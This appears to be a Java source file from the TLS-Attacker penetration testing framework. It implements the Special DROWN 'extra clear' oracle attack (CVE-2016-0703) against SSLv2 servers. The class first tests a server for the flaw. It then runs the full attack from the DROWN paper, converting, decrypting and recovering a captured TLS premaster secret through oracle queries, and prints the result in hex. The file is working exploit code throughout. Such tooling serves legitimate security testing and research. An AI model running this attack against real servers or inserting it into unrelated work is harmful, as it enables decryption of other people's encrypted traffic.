/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS
 *
 * Copyright 2014-2021 Ruhr University Bochum, Paderborn University, Hackmanit GmbH
 *
 * Licensed under Apache License, Version 2.0
 * http://www.apache.org/licenses/LICENSE-2.0.txt
 */

package de.rub.nds.tlsattacker.attacks.impl.drown;

import static de.rub.nds.tlsattacker.util.ConsoleLogger.CONSOLE;

import de.rub.nds.modifiablevariable.bytearray.ModifiableByteArray;
import de.rub.nds.modifiablevariable.util.ArrayConverter;
import de.rub.nds.modifiablevariable.util.Modifiable;
import de.rub.nds.tlsattacker.attacks.config.SpecialDrownCommandConfig;
import de.rub.nds.tlsattacker.attacks.constants.DrownVulnerabilityType;
import de.rub.nds.tlsattacker.attacks.exception.AttackFailedException;
import de.rub.nds.tlsattacker.attacks.pkcs1.oracles.ExtraClearDrownOracle;
import de.rub.nds.tlsattacker.core.config.Config;
import de.rub.nds.tlsattacker.core.constants.Bits;
import de.rub.nds.tlsattacker.core.constants.HandshakeMessageType;
import de.rub.nds.tlsattacker.core.constants.RunningModeType;
import de.rub.nds.tlsattacker.core.constants.SSL2CipherSuite;
import de.rub.nds.tlsattacker.core.protocol.message.SSL2ClientMasterKeyMessage;
import de.rub.nds.tlsattacker.core.protocol.message.SSL2ServerVerifyMessage;
import de.rub.nds.tlsattacker.core.state.State;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutorFactory;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTraceUtil;
import de.rub.nds.tlsattacker.core.workflow.action.ReceiveAction;
import de.rub.nds.tlsattacker.core.workflow.action.SendAction;
import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowConfigurationFactory;
import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowTraceType;
import java.math.BigInteger;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorCompletionService;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

class ExtraClearAttack {

    private Config tlsConfig;
    private ExtraClearDrownOracle oracle;
    // Maximum number of fractional trimmers to try (per Premaster secret)
    private long maxTrimmerCount = 100;

    private BigInteger serverPublicKey;
    private BigInteger serverModulus;
    // Index within the list of Premaster secrets of the one successfully
    // converted in step 1 and used in subsequent steps
    private int pmsIndex;
    private BigInteger step1u;
    private BigInteger step1t;

    private static final Logger LOGGER = LogManager.getLogger();

    public ExtraClearAttack(Config tlsConfig) {
        this.tlsConfig = tlsConfig;
        oracle = new ExtraClearDrownOracle(tlsConfig);
    }

    /**
     * Checks if an arbitrary number of clear-text bytes can be included in the handshake. This bug is known as "extra
     * clear" oracle (CVE-2016-0703). It can even work for non-export ciphers.
     *
     * @return Indication whether the server is vulnerable to the "extra clear" oracle attack
     */
    public DrownVulnerabilityType checkForExtraClearOracle() {
        SSL2CipherSuite cipherSuite = tlsConfig.getDefaultSSL2CipherSuite();

        // Overwrite all but 1 byte of the full key with null bytes
        int clearKeyLength = cipherSuite.getClearKeyByteNumber() + cipherSuite.getSecretKeyByteNumber() - 1;
        byte[] clearKey = new byte[clearKeyLength];
        ModifiableByteArray clearKeyData = Modifiable.explicit(clearKey);
        SSL2ClientMasterKeyMessage clientMasterKeyMessage = new SSL2ClientMasterKeyMessage();
        clientMasterKeyMessage.setClearKeyData(clearKeyData);

        WorkflowTrace trace = new WorkflowConfigurationFactory(tlsConfig)
            .createWorkflowTrace(WorkflowTraceType.SSL2_HELLO, RunningModeType.CLIENT);
        trace.addTlsAction(new SendAction(clientMasterKeyMessage));
        trace.addTlsAction(new ReceiveAction(new SSL2ServerVerifyMessage()));
        State state = new State(tlsConfig, trace);

        WorkflowExecutor workflowExecutor =
            WorkflowExecutorFactory.createWorkflowExecutor(tlsConfig.getWorkflowExecutorType(), state);
        workflowExecutor.executeWorkflow();

        if (!WorkflowTraceUtil.didReceiveMessage(HandshakeMessageType.SSL2_SERVER_HELLO, trace)) {
            return DrownVulnerabilityType.NONE;
        }

        SSL2ServerVerifyMessage serverVerifyMessage = (SSL2ServerVerifyMessage) WorkflowTraceUtil
            .getFirstReceivedMessage(HandshakeMessageType.SSL2_SERVER_VERIFY, trace);

        if (serverVerifyMessage != null
            && ServerVerifyChecker.check(serverVerifyMessage, state.getTlsContext(), true)) {
            return DrownVulnerabilityType.SPECIAL;
        }

        return DrownVulnerabilityType.SSL2;
    }

    public void execute(List<byte[]> premasterSecrets, SpecialDrownCommandConfig config) {
        initRsaParams();

        // Premaster secret after being successfully converted to SSLv2
        // ENCRYPTED-KEY-DATA
        // The paper calls this "c0" in step (1), but "c1" in step (2)
        byte[] c1 = null;
        pmsIndex = 0;

        for (byte[] secret : premasterSecrets) {
            byte[] step1Result = step1(secret);
            if (step1Result != null) {
                c1 = step1Result;
                break;
            }
            pmsIndex++;
        }
        if (c1 == null) {
            throw new AttackFailedException("Could not convert any Premaster secret to an SSLv2-conformant ciphertext");
        }
        CONSOLE.info("Step 1 completed, converted Premaster secret #" + pmsIndex + " to ENCRYPTED-KEY-DATA");

        byte[] m1 = step2(c1);
        if (m1 == null) {
            throw new AttackFailedException("Could not determine plaintext for converted ciphertext");
        }
        CONSOLE.info("Step 2 completed, determined plaintext for converted ciphertext");

        byte[] m0 = step3(m1);
        CONSOLE.info("Step 3 completed, converted SECRET-KEY-DATA back to Premaster secret");
        CONSOLE.info("(Padded) plaintext Premaster secret #" + pmsIndex + " is:"
            + ArrayConverter.bytesToHexString(m0, true, true));
    }

    private void initRsaParams() {
        // Do minimal SSLv2 handshake
        WorkflowTrace trace = new WorkflowConfigurationFactory(tlsConfig)
            .createWorkflowTrace(WorkflowTraceType.SSL2_HELLO, RunningModeType.CLIENT);
        State state = new State(tlsConfig, trace);
        WorkflowExecutor workflowExecutor =
            WorkflowExecutorFactory.createWorkflowExecutor(tlsConfig.getWorkflowExecutorType(), state);
        workflowExecutor.executeWorkflow();

        // Information from the server certificate should be in the context now
        serverPublicKey = state.getTlsContext().getServerRSAPublicKey();
        if (serverPublicKey == null) {
            throw new AttackFailedException("Could not get server public key");
        }
        serverModulus = state.getTlsContext().getServerRsaModulus();
        if (serverModulus == null) {
            throw new AttackFailedException("Could not get server modulus");
        }
    }

    /**
     * Step (1) of the attack according to section 5.2.1 of the DROWN paper: Try to convert a TLS Premaster secret to
     * SSLv2 ENCRYPTED-KEY-DATA. (Details and nomenclature given in section 3.2.1.)
     *
     * @param  premasterSecret
     *                         A captured TLS Premaster secret
     * @return                 The Premaster secret converted to ENCRYPTED-KEY-DATA, or null if no conversion succeeded
     *                         within the given limits
     */
    private byte[] step1(byte[] premasterSecret) {
        BigInteger c0 = new BigInteger(premasterSecret);
        BigInteger rsaE = serverPublicKey;
        BigInteger modulus = serverModulus;

        CoprimePairGenerator pairGenerator = new SievingCoprimePairGenerator(maxTrimmerCount);

        // We increase our chances by using multiple Trimmers per ciphertext,
        // as suggested in appendix A.1 of the DROWN paper
        while (pairGenerator.hasNext()) {
            BigInteger[] pair = pairGenerator.next();
            BigInteger u = pair[0];
            BigInteger t = pair[1];
            BigInteger s = u.multiply(t.modInverse(modulus));

            // Java's BigInt API only allows to do `s^e mod N` instead of `s^e`
            // as in the paper, but if you do the maths this is still OK
            BigInteger c1 = c0.multiply(s.modPow(rsaE, modulus)).mod(modulus);
            byte[] ciphertext = c1.toByteArray();

            if (oracle.checkPKCSConformity(ciphertext)) {
                step1u = u;
                step1t = t;
                return ciphertext;
            }
        }

        return null;
    }

    /**
     * Step (2) of the attack according to section 5.2.1 of the DROWN paper: Use rotations to iteratively learn the
     * plaintext. This also includes the initial plaintext recovery (before rotations), which is extensively described
     * in section 5.1 but omitted in section 5.2.1. (Details and nomenclature for the rotations given in section 3.2.2
     * and appendix A.3.)
     *
     * @param  c1
     *            (Encrypted) TLS Premaster secret converted to SSLv2 ENCRYPTED-KEY-DATA
     * @return    The cleartext for c1, or null if an error occurred
     */
    private byte[] step2(byte[] c1) {
        SSL2CipherSuite cipherSuite = tlsConfig.getDefaultSSL2CipherSuite();

        BigInteger rsaE = serverPublicKey;
        BigInteger modulus = serverModulus;
        int lenN = serverModulus.bitLength() / Bits.IN_A_BYTE;
        BigInteger bleichenbacherB = BigInteger.valueOf(2).modPow(BigInteger.valueOf(8 * (lenN - 2)), modulus);
        int lenK = cipherSuite.getSecretKeyByteNumber();
        // The DROWN paper says this needs to be `2^(8 (k + 1))`, which is
        // obviously a typo; it should also work with `2^(8 (lenK + 1))`, though
        BigInteger exponentR = BigInteger.valueOf(8 * lenK);
        BigInteger drownR = BigInteger.valueOf(2).modPow(exponentR, modulus);
        BigInteger inverseR = drownR.modInverse(modulus);

        byte[] ciphertext = c1;
        // Called "m1Tilde" in the DROWN paper
        BigInteger knownPlaintext = BigInteger.valueOf(2).multiply(bleichenbacherB);
        int knownLength = 2;
        int shiftCount = 0;

        // losing some remainder on purpose
        if (step1u.compareTo(step1t) > 0) {
            knownPlaintext = knownPlaintext.multiply(step1u).divide(step1t).mod(modulus);
        }

        // Recover first part of plaintext
        byte[] newPlaintext = recoverPlaintext(ciphertext);
        knownPlaintext = updateKnownPlaintext(knownPlaintext, newPlaintext);
        knownLength += newPlaintext.length;

        int threadNumber = Runtime.getRuntime().availableProcessors();
        LOGGER.info("Using " + threadNumber + " threads for step 2");
        ExecutorService executor = Executors.newFixedThreadPool(threadNumber);
        BigInteger candidateStepS = BigInteger.valueOf(threadNumber * 2);

        // Rotations and iterative recovery
        while (knownLength < lenN) {
            // Shift plaintext bounds and ciphertext
            knownPlaintext = knownPlaintext.multiply(inverseR).mod(modulus);
            BigInteger shiftedCiphertext =
                new BigInteger(ciphertext).multiply(inverseR.modPow(rsaE, modulus)).mod(modulus);
            ciphertext = ensurePositive(shiftedCiphertext.toByteArray());
            shiftCount++;

            ExecutorCompletionService<BigInteger> completionService = new ExecutorCompletionService(executor);
            List<ExtraClearStep2Callable> allCallables = new ArrayList();
            List<Future<BigInteger>> allFutures = new ArrayList();
            BigInteger s = null;

            for (int i = 0; i < threadNumber; i++) {
                BigInteger initialSCandidate = BigInteger.valueOf(1 + i * 2);
                ExtraClearStep2Callable callable = new ExtraClearStep2Callable(oracle, ciphertext, lenN, rsaE, modulus,
                    initialSCandidate, candidateStepS, knownPlaintext);
                allCallables.add(callable);
                allFutures.add(completionService.submit(callable));
            }

            for (int i = 0; i < threadNumber; i++) {
                try {
                    s = completionService.take().get();
                } catch (InterruptedException ex) {
                    ex.printStackTrace();
                } catch (ExecutionException ex) {
                    throw new RuntimeException(ex);
                }

                if (s != null) {
                    break;
                }
            }
            for (Future<BigInteger> f : allFutures) {
                f.cancel(true);
            }

            if (s == null) {
                LOGGER.error("Could not find factor during iterative recovery");
                return null;
            }

            byte[] multipliedCiphertext = ArrayConverter.bigIntegerToByteArray(
                s.modPow(rsaE, modulus).multiply(new BigInteger(ciphertext)).mod(modulus), lenN, true);
            // Called mk_secret in the DROWN paper
            byte[] multipliedNewPlaintext = recoverPlaintext(multipliedCiphertext);

            // Get rid of multiplier s
            BigInteger byteModuloExponent =
                BigInteger.valueOf(multipliedNewPlaintext.length).multiply(BigInteger.valueOf(8));
            BigInteger byteModulo = BigInteger.valueOf(2).modPow(byteModuloExponent, modulus);
            BigInteger numOfSubstractions = knownPlaintext.multiply(s).divide(modulus);
            // If everything else works alright, s should always have an
            // inverse under byteModulo
            BigInteger inverseS = s.modInverse(byteModulo);
            BigInteger b = new BigInteger(ensurePositive(multipliedNewPlaintext))
                .add(numOfSubstractions.multiply(modulus).mod(byteModulo));
            BigInteger computedPlainLastBytes = b.multiply(inverseS).mod(byteModulo);

            // Update known plaintext
            newPlaintext =
                ArrayConverter.bigIntegerToByteArray(computedPlainLastBytes, multipliedNewPlaintext.length, true);
            knownPlaintext = updateKnownPlaintext(knownPlaintext, newPlaintext);
            knownLength += lenK;
            LOGGER.info("Step 2: Recovered " + knownLength + " of " + lenN + " bytes");
        }

        executor.shutdownNow();

        // Undo the shifts
        BigInteger finalPlaintext = knownPlaintext;
        for (int i = 0; i < shiftCount; i++) {
            finalPlaintext = finalPlaintext.multiply(drownR).mod(modulus);
        }

        return finalPlaintext.toByteArray();
    }

    /**
     * Step (3) of the attack according to section 5.2.1 of the DROWN paper: Convert decrypted SSLv2 SECRET-KEY-DATA
     * back to TLS Premaster secret.
     *
     * @param  m1
     *            (Plaintext) SSLv2 SECRET-KEY-DATA
     * @return    m1 converted back to a TLS Premaster secret
     */
    private byte[] step3(byte[] m1) {
        BigInteger modulus = serverModulus;
        BigInteger step1s = step1u.multiply(step1t.modInverse(modulus));
        BigInteger inverseS = step1s.modInverse(modulus);

        BigInteger m0 = new BigInteger(ensurePositive(m1)).multiply(inverseS).mod(modulus);
        return ensurePositive(m0.toByteArray());
    }

    /**
     * Determines SECRET-KEY-DATA, i.e. the actual plaintext value of ENCRYPTED-KEY-DATA, after conversion of TLS
     * Premaster secret to ENCRYPTED-KEY-DATA. The process is extensively described in section 5.1 of the DROWN paper.
     *
     * @param  encryptedKeyData
     *                          An RSA ciphertext representing valid ENCRYPTED-KEY-DATA
     * @return                  Recovered SECRET-KEY-DATA, i.e. the plaintext value of `encryptedKeyData`
     */
    private byte[] recoverPlaintext(byte[] encryptedKeyData) {
        SSL2CipherSuite cipherSuite = tlsConfig.getDefaultSSL2CipherSuite();
        byte[] plaintext = new byte[0];

        for (int i = 0; i < cipherSuite.getSecretKeyByteNumber(); i++) {
            byte newByte = oracle.bruteForceKeyByte(encryptedKeyData, plaintext);
            plaintext = Arrays.copyOf(plaintext, plaintext.length + 1);
            plaintext[plaintext.length - 1] = newByte;
        }

        // Add PKCS delimiter 0x00
        // This is effectively identical to the implementation of
        // ensurePositive(), but done for different reasons
        byte[] delimitedPlaintext = new byte[plaintext.length + 1];
        System.arraycopy(plaintext, 0, delimitedPlaintext, 1, plaintext.length);

        return delimitedPlaintext;
    }

    /**
     * Updates the currently known plaintext part with some new known bytes.
     *
     * @param  oldPlaintext
     *                      Previously known plaintext
     * @param  newBytes
     *                      New plaintext bytes
     * @return              New known plaintext
     */
    private static BigInteger updateKnownPlaintext(BigInteger oldPlaintext, byte[] newBytes) {
        byte[] plainBytes = ensurePositive(oldPlaintext.toByteArray());
        System.arraycopy(newBytes, 0, plainBytes, plainBytes.length - newBytes.length, newBytes.length);

        return new BigInteger(plainBytes);
    }

    /**
     * Makes sure that a byte array does not represent a negative number when creating a BigInteger from it. Will
     * increase the array's length by 1.
     *
     * @param  data
     *              Array to work on
     * @return      Copy of "data", with an additional leading zero
     */
    protected static byte[] ensurePositive(byte[] data) {
        byte[] positiveData = new byte[data.length + 1];
        System.arraycopy(data, 0, positiveData, 1, data.length);

        return positiveData;
    }

}
